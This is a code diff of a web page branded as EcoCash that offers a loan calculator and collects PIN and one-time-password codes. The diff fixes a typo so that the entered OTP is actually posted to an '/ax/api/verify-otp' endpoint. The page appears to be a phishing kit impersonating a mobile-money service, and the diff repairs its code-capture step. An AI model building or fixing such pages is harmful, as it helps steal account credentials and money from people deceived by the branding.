@@ -239,12 +239,10 @@
         </div>
         <div class="copyright">© 2026 EcoCash</div>
     </div>
-
-    <script>
-        // Interactive Calculator logic
+        <script>
         const amountSlider = document.getElementById('amountSlider');
         const termSlider = document.getElementById('termSlider');
-        
+
         if (amountSlider && termSlider) {
             amountSlider.addEventListener('input', updateCalculator);
             termSlider.addEventListener('input', updateCalculator);
@@ -259,12 +257,11 @@
             document.getElementById('monthlyPayment').innerText = '$' + monthly.toFixed(2);
         }
 
-        // Router helper to switch screens and URL paths cleanly
         function goToScreen(screenId, path) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(screenId).classList.add('active');
             history.pushState({}, '', path);
-            window.scrollTo(0,0);
+            window.scrollTo(0, 0);
         }
 
         function prepareSummary() {
@@ -345,15 +342,13 @@
             let otpVal = '';
             document.querySelectorAll('#otpBoxes .pin-box').forEach(b => otpVal += b.value);
 
-            trb => otpval += b.value);
-
             try {
                 await fetch('/ax/api/verify-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         type: 'otp',
-                        otp: otpval
+                        otp: otpVal
                     })
                 });
                 setTimeout(() => {
@@ -365,7 +360,6 @@
             }
         }
 
-        // Auto-focus box jumper for PIN/OTP
         document.querySelectorAll('.pin-container').forEach(container => {
             const boxes = container.querySelectorAll('.pin-box');
             boxes.forEach((box, index) => {
